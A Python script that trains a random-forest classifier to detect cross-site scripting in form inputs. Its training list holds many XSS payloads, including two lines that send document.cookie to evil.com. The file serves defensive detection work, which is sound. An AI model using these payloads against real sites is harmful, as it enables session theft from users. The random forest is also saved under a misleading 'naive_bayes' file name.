import pandas as pd
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
import joblib
import logging
import os

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='logs/training.log'
)
logger = logging.getLogger(__name__)

def train_xss_model():
    # XSS attack patterns
    xss_attacks = [
        # Basic XSS
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<ScRiPt>alert(1)</ScRiPt>",
        
        # Event handlers
        "<img src=x onerror=alert(1)>",
        "<img src=x onload=alert(1)>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<input onfocus=alert(1)>",
        
        # JavaScript protocol
        "javascript:alert(1)",
        "javascript:alert(document.cookie)",
        
        # Encoded XSS
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        
        # DOM XSS
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "<script>eval('alert(1)')</script>",
        
        # Data exfiltration
        "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
        "<script>new Image().src='http://evil.com?cookie='+document.cookie;</script>"
    ]

    # Safe/benign inputs
    benign_inputs = [
        # Names
        "John Doe", "Jane Smith", "Robert Johnson",
        "Maria Garcia", "Mohammed Ahmed", "Li Wei",
        
        # Addresses
        "123 Main Street", "456 Elm Avenue", "789 Oak Road",
        "321 Pine Lane", "159 Maple Drive",
        
        # Locations
        "New York, NY", "London, UK", "Tokyo, Japan",
        "Paris, France", "Sydney, Australia",
        
        # Mixed content
        "Apartment 4B", "Suite 200", "Floor 15",
        "Building 7", "Unit 23",
        
        # Numbers and special characters
        "12345", "A-123", "B/456", "C_789", "#1000",
        
        # Email addresses
        "user@example.com", "john.doe@company.com",
        
        # Phone numbers
        "+1-123-456-7890", "(555) 123-4567"
    ]

    # Create dataset
    data = {
        'input': xss_attacks + benign_inputs,
        'label': ['attack'] * len(xss_attacks) + ['normal'] * len(benign_inputs)
    }
    
    df = pd.DataFrame(data)
    
    # Split data
    X_train, X_test, y_train, y_test = train_test_split(
        df['input'], df['label'], 
        test_size=0.2, 
        random_state=42
    )
    
    # Create and fit vectorizer
    vectorizer = TfidfVectorizer(
        max_features=1000,
        ngram_range=(1, 4),  # Include character n-grams
        analyzer='char'  # Character-level analysis for better pattern detection
    )
    
    X_train_vec = vectorizer.fit_transform(X_train)
    X_test_vec = vectorizer.transform(X_test)
    
    # Train model
    model = RandomForestClassifier(
        n_estimators=100,
        max_depth=10,
        class_weight='balanced'
    )
    model.fit(X_train_vec, y_train)
    
    # Evaluate model
    train_score = model.score(X_train_vec, y_train)
    test_score = model.score(X_test_vec, y_test)
    
    logger.info(f"Training accuracy: {train_score:.2f}")
    logger.info(f"Testing accuracy: {test_score:.2f}")
    
    # Create models directory
    os.makedirs('models', exist_ok=True)
    
    # Save models
    joblib.dump(vectorizer, 'models/vectorizer.pkl')
    joblib.dump(model, 'models/naive_bayes_model.pkl')
    
    logger.info("Models saved successfully!")
    
    # Test predictions
    test_inputs = [
        "<script>alert(1)</script>",  # XSS attack
        "John Doe",  # Normal name
        "<img src=x onerror=alert(1)>",  # XSS attack
        "123 Main Street"  # Normal address
    ]
    
    for input_text in test_inputs:
        X = vectorizer.transform([input_text])
        pred = model.predict(X)[0]
        conf = np.max(model.predict_proba(X)[0])
        logger.info(f"Input: {input_text}")
        logger.info(f"Prediction: {pred} (confidence: {conf:.2%})")
        logger.info("-" * 50)

if __name__ == "__main__":
    train_xss_model() 